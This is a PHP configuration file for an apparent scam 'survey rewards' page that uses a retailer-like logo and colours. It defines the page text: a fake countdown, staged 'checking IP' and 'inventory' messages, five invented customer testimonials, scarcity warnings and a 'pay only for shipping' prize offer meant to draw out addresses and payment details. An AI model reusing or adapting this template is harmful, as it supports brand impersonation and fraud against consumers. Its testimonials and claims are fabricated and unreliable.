<?php

// product
$wallID = "1";

// brand
$brandLogo = "/templates/brands/wal_logo.png";
$favicon = "/templates/brands/wal_favicon.png";
$mainColor = "#0071CE";
$secondaryColor = "#ffc220";
$headerColor = "#fff";
$white = "true";

// geo
$geo = "uk";
$langTag = "en";
$currency = "$";

// texts
$texts = [
    "us-dhh" => [
        "title" => "Survey Rewards",
        "text1" => "",
        "text2" => "Survey About",
        "text3" => "",
        "text4" => "We would like to offer you a unique opportunity to receive a brand new",
        "text5" => "To claim, simply take this short survey about your experience with",
        "text6" => "Attention!",
        "text7" => "This survey offer expires today,",
        "text8" => "START SURVEY",
        "text9" => "Please wait while we process your answers...",
        "text10" => "Submitting answers...",
        "text11" => "Checking for duplicate IP addresses...",
        "text12" => "Checking our inventory for products...",
        "text13" => "Congratulations...",
        "text14" => "Answers submitted",
        "text15" => "IP address checked",
        "text16" => "Products available in stock",
        "text17" => "Thank you for completing the survey!",
        "text18" => "Because you helped provide extremely valuable consumer data, you may now choose some of the following exclusive rewards below.",
        "text19" => "Please note that if you leave this page without claiming your reward, we have no choice but to give another visitor a chance to participate in our rewards program.",
        "text20" => "Price:",
        "text21" => "Left in Stock:",
        "text22" => "Pay only for shipping!",
        "text23" => "CLAIM REWARD",
        "text24" => "New Comment",
        "text25" => "Comments (5)",
        "text26" => "Submit",
        "text27" => "I just received this through email and gave it a try. Excited to get my reward! Can I also send the survey to my friends?",
        "text28" => "Actually got a prize from this survey! I was skeptical at first but gave it a try. And look what just arrived in the mail!",
        "text29" => "Lol such a cool survey but too bad I didn&#x27;t get any prize.. ",
        "text30" => "I usually dont take these kind of online surveys but this is actually a good one!! We will put this prize to good use thanks so much!!",
        "text31" => "Where can I do more surveys like these? I like getting prizes :)",
        "text32" => "",
        "text33" => "*Products offered on the last page require shipping and handling fees. See manufacturer&#x27;s site for details as terms vary with offers. See important terms and conditions regarding this survey, website and advertisement.",
        "text34" => "*Important: Shipping costs may apply.",
        "text35" => "Offer expires in",
        "text36" => "Congratulations!",
        "text37" => "We have reserved (1)",
        "text38" => "exclusively for you.",
        "text39" => "How to claim your",
        "text40" => "Fill in your shipping address.",
        "text41" => "Pay only shipping costs to receive your prize.",
        "text42" => "Your prize will be delivered in 5-7 working days.",
        "text43" => "Continue",
        "text44" => "",
        "text45" => ""
    ]
];

?>